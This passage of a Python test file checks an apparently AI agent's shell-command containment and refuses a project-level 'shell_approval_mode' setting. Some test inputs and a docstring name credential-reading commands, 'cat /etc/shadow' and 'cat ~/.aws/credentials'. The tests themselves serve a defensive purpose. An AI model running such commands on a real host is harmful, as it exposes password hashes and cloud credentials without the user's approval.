        assert seen == {INERT, HOST_READ, SANDBOXED, SANDBOXED_NET, UNKNOWN}

    def test_inert_and_host_read_are_both_uncontained(self, tmp_path):
        """Naming a tier "inert" never made it contained -- the light path
        is a HOST subprocess. Reading that tier as safe is what #157
        was."""
        for command in ("ls", "cat /etc/shadow"):
            profile = classify_command(command, str(tmp_path))
            assert containment_for(
                profile, docker_available=True) == UNCONTAINED


class TestShellApprovalModeIsRejectedBySettingsJson:
    """ROADMAP_v2 §28 (G7). R12's rule applied to a third kind of key."""

    @staticmethod
    def _validate(data):
        from core.config_loader import _validate_settings
        _validate_settings(data, "test-settings.json")

    def test_it_is_rejected_by_name_not_as_an_unknown_key(self):
        """The message matters as much as the rejection. The generic
        "unknown key" branch reads as an oversight someone should fix by
        adding support -- and supporting it would let a project's
        settings.json, which beats the user's (D29), set "never" and turn
        `cat ~/.aws/credentials` into an unprompted host read.

        D17's trust prompt is not a substitute: the same prompt covers a
        README-shaped CONTEXT.md, and nobody reading it is deciding about
        their shell gate."""
        with pytest.raises(ValueError) as exc:
            self._validate({"shell_approval_mode": "never"})
        message = str(exc.value)
        assert "deliberately not supported" in message
        assert "SHELL_APPROVAL_MODE" in message
        assert "unknown key" not in message

    def test_every_value_is_rejected_the_same_way(self):
        """Including the ones that would TIGHTEN. The key is refused
        because of where it can come from, not because of what it says --
        accepting "always" from a project would make the absence of the
        key the only thing standing between a repo and setting it."""
        for value in ("never", "tiered", "always", "nonsense"):
            with pytest.raises(ValueError, match="deliberately not"):
                self._validate({"shell_approval_mode": value})

    def test_a_near_miss_still_gets_the_generic_message(self):
        """The by-name branch must not swallow the ordinary typo case."""
        with pytest.raises(ValueError, match="unknown key"):
            self._validate({"shell_approval_mod": "never"})
